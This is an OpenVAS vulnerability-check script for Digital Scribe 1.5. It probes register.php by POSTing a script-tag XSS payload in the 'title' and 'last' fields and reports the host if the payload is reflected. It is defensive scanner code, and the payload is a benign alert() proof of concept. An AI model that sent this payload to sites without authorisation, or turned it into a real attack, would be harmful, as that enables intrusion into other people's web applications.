##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_digital_scribe_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Digital Scribe Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute HTML code into
  user's browser session in the context of an affected site.
  Impact Level: Application.";
tag_affected = "Digital Scribe version 1.5";
tag_insight = "The flaws are due to inputs passed through POST parameters 'title',
  'last' and 'email' in 'register.php' are not sanitized before being returned
  to the user.";
tag_solution = "No solution or patch is available as of 1st Aug 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.digital-scribe.org/";
tag_summary = "This host is running Digital Scribe and is prone to multiple cross
  site scripting vulnerabilities.";

if(description)
{
  script_id(802128);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-05 09:04:20 +0200 (Fri, 05 Aug 2011)");
  script_bugtraq_id(48945);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Digital Scribe Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/37715/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17590/");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5030.php");

  script_description(desc);
  script_summary("Check if Digital Scribe is prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
dsPort = get_http_port(default:80);
if(!dsPort){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:dsPort)) {
  exit(0);
}

foreach path (make_list("/DigitalScribe", "/digitalscribe", cgi_dirs()))
{
  ## Send and receive response
  sndReq = http_get(item:string(path, "/index.php"), port:dsPort);
  rcvRes = http_send_recv(port:dsPort, data:sndReq);

  ## Confirm the application
  if("<TITLE>Digital Scribe</TITLE>" >< rcvRes)
  {
    ## Try an exploit
    exp = 'title="><script>alert("XSS")</script>&last="><script>alert("XSS")' +
           '</script>&passuno=&passuno2=&email=&action=4&Submit=Register';

    req = string("POST ", path, "/register.php HTTP/1.1\r\n",
                 "Host: ",get_host_ip(),"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(exp), "\r\n\r\n",
                 exp);
    res = http_keepalive_send_recv(port:dsPort, data:req);

    ## Check the response to confirm vulnerability
    if('><script>alert("XSS")</script>' >< res)
    {
      security_warning(dsPort);
      exit(0);
    }
  }
}
